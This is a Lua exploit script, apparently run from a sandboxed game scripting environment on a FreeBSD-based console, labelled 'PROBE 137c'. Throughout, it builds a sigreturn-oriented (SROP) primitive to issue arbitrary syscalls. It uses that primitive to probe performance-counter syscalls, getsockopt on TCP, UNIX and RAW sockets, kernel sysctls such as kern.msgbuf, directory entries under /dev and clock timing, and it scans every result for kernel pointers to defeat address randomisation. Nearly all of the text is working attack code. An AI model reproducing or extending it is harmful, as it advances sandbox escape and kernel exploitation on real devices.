-- CRASH_CLASS: LOW
-- PROBE 137c: PMC, socket options, kern.msgbuf, getdirentries
--
-- Contract-informed attacks. No threads (crashes game).
-- A: sys 563-567 (PMC enable/configure/read) — side channel potential
-- B: getsockopt deep scan on TCP/RAW/UNIX sockets
-- C: kern.msgbuf with large buffer via SROP sysctl
-- D: getdirentries(196) on /dev for inode leak
-- E: recvmsg ancillary data scan

print("=== PROBE 137c: PMC + SOCKOPT + MSGBUF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- SECTION A: sys 563-567 — Performance Monitoring Counters
-- 563: enable PMC, 564: disable, 565: configure, 566: write, 567: read
--------------------------------------------------------------------
print("")
print("--- [A] PMC (sys 563-567) ---")

-- 563: enable per-thread PMC
local rv563 = srop(563)
print("[A] 563(enable)=" .. hex(rv563))

-- Try with args
rv563 = srop(563, uint64(0))
print("[A] 563(0)=" .. hex(rv563))
rv563 = srop(563, uint64(1))
print("[A] 563(1)=" .. hex(rv563))

-- 565: configure event selector (6 selectors)
-- Try selector 0 with instruction count event
for sel = 0, 5 do
    local rv565 = srop(565, uint64(sel), uint64(0x76))
    local r565h, r565l = get_hi_lo(rv565)
    if r565l == 0 and r565h == 0 then
        print(string.format("[A] 565(sel=%d, event=0x76) WORKS!", sel))
    end
end

-- 567: read counter — contract says user ptr for output
local pmc_buf = gpu + 0x100
zero(pmc_buf, 0x40)
-- Try: 567(thread_id, counter_index, output_ptr)
local rv567 = srop(567, uint64(0), uint64(0), ua(pmc_buf))
print("[A] 567(0,0,buf)=" .. hex(rv567))
local r567h, r567l = get_hi_lo(rv567)
if r567l == 0 and r567h == 0 then
    print("[A] PMC output:")
    for off = 0, 0x30, 8 do
        local v = safe_rq(pmc_buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("  +0x%02X: %s", off, hex(v)))
            end
        end
    end
end

-- Try different arg layouts
rv567 = srop(567, ua(pmc_buf), uint64(0))
print("[A] 567(buf,0)=" .. hex(rv567))
rv567 = srop(567, ua(pmc_buf))
print("[A] 567(buf)=" .. hex(rv567))

-- 566: write counter values
rv567 = srop(566, uint64(0), uint64(0x1000))
print("[A] 566(0,0x1000)=" .. hex(rv567))

print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: getsockopt deep scan
-- SOL_SOCKET=0xFFFF, IPPROTO_TCP=6, IPPROTO_IP=0, IPPROTO_RAW=255
-- Some socket options copy kernel state to userland
--------------------------------------------------------------------
print("")
print("--- [B] getsockopt scan ---")

-- Use fd 4 (TCP socket to loader)
-- getsockopt(fd, level, optname, optval, optlen)
-- sys 118 on FreeBSD
local sock_buf = gpu + 0x200
local sock_len = gpu + 0x280

-- SOL_SOCKET options that might leak
local sol_opts = {
    {name="SO_TYPE", val=0x1008},
    {name="SO_ERROR", val=0x1007},
    {name="SO_SNDBUF", val=0x1001},
    {name="SO_RCVBUF", val=0x1002},
    {name="SO_SNDLOWAT", val=0x1003},
    {name="SO_RCVLOWAT", val=0x1004},
    {name="SO_ACCEPTCONN", val=0x0002},
    {name="SO_PEERLABEL", val=0x1010},
    {name="SO_LISTENQLIMIT", val=0x1011},
    {name="SO_LISTENQLEN", val=0x1012},
    {name="SO_LISTENINCQLEN", val=0x1013},
    {name="SO_USER_COOKIE", val=0x1015},
    {name="SO_PROTOCOL", val=0x1016},
    {name="SO_DOMAIN", val=0x1019},
    {name="SO_TS_CLOCK", val=0x1017},
    {name="SO_MAX_PACING_RATE", val=0x1018},
}

for _, opt in ipairs(sol_opts) do
    zero(sock_buf, 0x100)
    memory.write_qword(sock_len, uint64(0x100))
    local rv_gs = srop(118, uint64(4), uint64(0xFFFF), uint64(opt.val),
        ua(sock_buf), ua(sock_len))
    local gsh, gsl = get_hi_lo(rv_gs)
    if gsl == 0 and gsh == 0 then
        local retlen = to_num(memory.read_qword(sock_len))
        local val = safe_rq(sock_buf)
        local vh, vl = get_hi_lo(val)
        print(string.format("[B] %s: %d bytes, val=%s", opt.name, retlen, hex(val)))
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print("  *** KERNEL POINTER! ***")
        end
        -- Check all returned bytes for kernel pointers
        for off = 0, math.min(retlen, 0x80) - 4, 8 do
            local v2 = safe_rq(sock_buf + off)
            if v2 then
                local v2h, v2l = get_hi_lo(v2)
                if v2h >= 0xFFFF8000 and v2h ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("  *** KPTR at +0x%02X: %s ***", off, hex(v2)))
                end
            end
        end
    end
end

-- IPPROTO_TCP options (level=6)
local tcp_opts = {
    {name="TCP_INFO", val=32},
    {name="TCP_CCALGOOPT", val=65},
    {name="TCP_CONGESTION", val=64},
    {name="TCP_FUNCTION_BLK", val=8192},
    {name="TCP_KEEPIDLE", val=256},
    {name="TCP_KEEPINTVL", val=512},
    {name="TCP_KEEPCNT", val=1024},
    {name="TCP_FASTOPEN", val=0x0401},
    {name="TCP_LOG", val=34},
    {name="TCP_LOGID", val=36},
    {name="TCP_LOGDUMP", val=37},
    {name="TCP_LOGDUMPSPEC", val=38},
}

for _, opt in ipairs(tcp_opts) do
    zero(sock_buf, 0x200)
    memory.write_qword(sock_len, uint64(0x200))
    local rv_gs = srop(118, uint64(4), uint64(6), uint64(opt.val),
        ua(sock_buf), ua(sock_len))
    local gsh, gsl = get_hi_lo(rv_gs)
    if gsl == 0 and gsh == 0 then
        local retlen = to_num(memory.read_qword(sock_len))
        print(string.format("[B] TCP_%s: %d bytes", opt.name, retlen))
        for off = 0, math.min(retlen, 0x100) - 4, 8 do
            local v = safe_rq(sock_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("  *** KPTR at +0x%02X: %s ***", off, hex(v)))
                end
            end
        end
    end
end

-- Create UNIX socket and check its options
local rv_unix = srop(97, uint64(1), uint64(1), uint64(0))
local uxh, uxl = get_hi_lo(rv_unix)
if uxl > 0 and uxl < 256 and uxh == 0 then
    print("[B] UNIX socket fd=" .. uxl)
    -- LOCAL_PEERCRED (SOL_LOCAL=0, opt=1)
    zero(sock_buf, 0x100)
    memory.write_qword(sock_len, uint64(0x100))
    local rv_pc = srop(118, uint64(uxl), uint64(0), uint64(1),
        ua(sock_buf), ua(sock_len))
    local pch, pcl = get_hi_lo(rv_pc)
    if pcl == 0 and pch == 0 then
        local retlen = to_num(memory.read_qword(sock_len))
        print("[B] LOCAL_PEERCRED: " .. retlen .. " bytes")
        for off = 0, math.min(retlen, 0x40) - 4, 8 do
            local v = safe_rq(sock_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%02X: %s", off, hex(v)))
                end
            end
        end
    end
    srop(6, uint64(uxl))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: kern.msgbuf with large buffer
-- MIB {1, 8} — kernel log messages
--------------------------------------------------------------------
print("")
print("--- [C] kern.msgbuf ---")

local mib = gpu + 0x300
local outbuf = gpu + 0x400
local oldlenp = gpu + 0x3F00

-- kern.msgbuf: MIB {1, 8}
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 8)
zero(outbuf, 0x1000)
memory.write_qword(oldlenp, uint64(0x1000))

local rv_mb = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp),
    uint64(0), uint64(0))
local retlen_mb = to_num(memory.read_qword(oldlenp))
print("[C] kern.msgbuf rv=" .. hex(rv_mb) .. " len=" .. retlen_mb)

if to_num(rv_mb) == 0 and retlen_mb > 8 then
    print("[C] GOT MORE THAN 8 BYTES!")
    -- Read as string
    local s = ""
    for i = 0, math.min(retlen_mb, 512) - 1 do
        local b = to_num(memory.read_byte(outbuf + i))
        if b >= 32 and b < 127 then s = s .. string.char(b)
        elseif b == 10 then s = s .. "\n"
        end
    end
    if #s > 0 then print("[C] " .. s) end
    -- Scan for kernel pointers
    for off = 0, math.min(retlen_mb, 0x800) - 4, 8 do
        local v = safe_rq(outbuf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[C] *** KPTR at +0x%02X: %s ***", off, hex(v)))
            end
        end
    end
end

-- kern.log: MIB {1, 7}
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 7)
zero(outbuf, 0x100)
memory.write_qword(oldlenp, uint64(0x100))
local rv_log = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp),
    uint64(0), uint64(0))
local retlen_log = to_num(memory.read_qword(oldlenp))
print("[C] kern.log rv=" .. hex(rv_log) .. " len=" .. retlen_log)

-- kern.conftxt: MIB {1, 41} — kernel config
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 41)
zero(outbuf, 0x200)
memory.write_qword(oldlenp, uint64(0x200))
local rv_conf = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp),
    uint64(0), uint64(0))
print("[C] kern.conftxt rv=" .. hex(rv_conf))

-- kern.geom.confxml: MIB {1, 113, 1} — GEOM config
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 113)
memory.write_dword(mib + 8, 1)
zero(outbuf, 0x200)
memory.write_qword(oldlenp, uint64(0x200))
local rv_geom = srop(202, ua(mib), uint64(3), ua(outbuf), ua(oldlenp),
    uint64(0), uint64(0))
print("[C] kern.geom rv=" .. hex(rv_geom))

print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: getdirentries(196) on /dev
--------------------------------------------------------------------
print("")
print("--- [D] getdirentries /dev ---")

local path_buf = gpu + 0x3000
ws(path_buf, "/dev")
local fd_dev = srop(5, ua(path_buf), uint64(0x20000))  -- O_RDONLY|O_DIRECTORY
print("[D] open /dev fd=" .. hex(fd_dev))

local fdh, fdl = get_hi_lo(fd_dev)
if fdl > 0 and fdl < 256 and fdh == 0 then
    local dir_buf = gpu + 0x3100
    local basep = gpu + 0x3F80
    zero(dir_buf, 0x1000)
    memory.write_qword(basep, uint64(0))

    -- getdirentries(196): fd, buf, nbytes, basep
    local rv_gd = srop(196, uint64(fdl), ua(dir_buf), uint64(0x1000), ua(basep))
    print("[D] getdirentries rv=" .. hex(rv_gd))
    local gdh, gdl = get_hi_lo(rv_gd)

    if gdl > 0 and gdl < 0x2000 and gdh == 0 then
        print("[D] " .. gdl .. " bytes of entries")
        -- Parse dirent structures
        -- struct dirent { d_fileno(4), d_reclen(2), d_type(1), d_namlen(1), d_name[] }
        local offset = 0
        local entry_count = 0
        while offset < gdl and entry_count < 30 do
            local fileno = to_num(memory.read_dword(dir_buf + offset))
            local reclen = to_num(memory.read_dword(dir_buf + offset + 4)) % 65536
            local dtype = math.floor(to_num(memory.read_dword(dir_buf + offset + 4)) / 65536) % 256
            local namlen = math.floor(to_num(memory.read_dword(dir_buf + offset + 4)) / 16777216)
            if reclen == 0 then break end
            -- Read name
            local name = ""
            for i = 0, math.min(namlen, 30) - 1 do
                local b = to_num(memory.read_byte(dir_buf + offset + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 0 then
                print(string.format("[D]   ino=%d type=%d %s", fileno, dtype, name))
            end
            -- Check if fileno is suspicious (kernel address range)
            if fileno > 0xFFFF0000 then
                print("[D]   *** suspicious inode ***")
            end
            offset = offset + reclen
            entry_count = entry_count + 1
        end
    end
    srop(6, uint64(fdl))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: Clock timing test for side channel
-- clock_gettime(232) with various clock IDs
--------------------------------------------------------------------
print("")
print("--- [E] clock timing ---")

local ts_buf = gpu + 0x3F00
for clk = 0, 15 do
    zero(ts_buf, 0x20)
    local rv_cg = srop(232, uint64(clk), ua(ts_buf))
    local cgh, cgl = get_hi_lo(rv_cg)
    if cgl == 0 and cgh == 0 then
        local sec = safe_rq(ts_buf)
        local nsec = safe_rq(ts_buf + 8)
        print(string.format("[E] clock %d: sec=%s nsec=%s", clk, hex(sec), hex(nsec)))
    end
end

-- Now time a few syscalls to see if we have microsecond precision
zero(ts_buf, 0x20)
srop(232, uint64(4), ua(ts_buf))  -- CLOCK_MONOTONIC_PRECISE=4 or REALTIME=0
local t1_sec = to_num(safe_rq(ts_buf))
local t1_nsec = to_num(safe_rq(ts_buf + 8))

-- Do 100 getpid calls
for i = 1, 100 do srop(20) end

zero(ts_buf, 0x20)
srop(232, uint64(4), ua(ts_buf))
local t2_sec = to_num(safe_rq(ts_buf))
local t2_nsec = to_num(safe_rq(ts_buf + 8))

print(string.format("[E] 100x getpid: %d.%09d → %d.%09d", t1_sec, t1_nsec, t2_sec, t2_nsec))
local elapsed = (t2_sec - t1_sec) * 1000000000 + (t2_nsec - t1_nsec)
print("[E] elapsed=" .. elapsed .. "ns (" .. math.floor(elapsed/100) .. "ns/call)")
print("[E] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION F: RAW socket getsockopt
--------------------------------------------------------------------
print("")
print("--- [F] RAW socket opts ---")

-- Create RAW socket
local rv_raw = srop(97, uint64(2), uint64(3), uint64(255))
local rawh, rawl = get_hi_lo(rv_raw)
if rawl > 0 and rawl < 256 and rawh == 0 then
    print("[F] RAW fd=" .. rawl)
    -- IP_OPTIONS (level=0, opt=1)
    zero(sock_buf, 0x100)
    memory.write_qword(sock_len, uint64(0x100))
    local rv_ipo = srop(118, uint64(rawl), uint64(0), uint64(1),
        ua(sock_buf), ua(sock_len))
    local ipoh, ipol = get_hi_lo(rv_ipo)
    if ipol == 0 and ipoh == 0 then
        local retlen = to_num(memory.read_qword(sock_len))
        print("[F] IP_OPTIONS: " .. retlen .. " bytes")
    end

    -- IP_HDRINCL (opt=2)
    zero(sock_buf, 0x100)
    memory.write_qword(sock_len, uint64(0x100))
    rv_ipo = srop(118, uint64(rawl), uint64(0), uint64(2),
        ua(sock_buf), ua(sock_len))
    ipoh, ipol = get_hi_lo(rv_ipo)
    if ipol == 0 and ipoh == 0 then
        print("[F] IP_HDRINCL=" .. hex(safe_rq(sock_buf) or uint64(0)))
    end

    -- SO_LABEL (level=0xFFFF, opt=0x1009)
    zero(sock_buf, 0x200)
    memory.write_qword(sock_len, uint64(0x200))
    rv_ipo = srop(118, uint64(rawl), uint64(0xFFFF), uint64(0x1009),
        ua(sock_buf), ua(sock_len))
    ipoh, ipol = get_hi_lo(rv_ipo)
    if ipol == 0 and ipoh == 0 then
        local retlen = to_num(memory.read_qword(sock_len))
        print("[F] SO_LABEL: " .. retlen .. " bytes")
        for off = 0, math.min(retlen, 0x80) - 4, 8 do
            local v = safe_rq(sock_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%02X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end
    srop(6, uint64(rawl))
end
print("[F] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
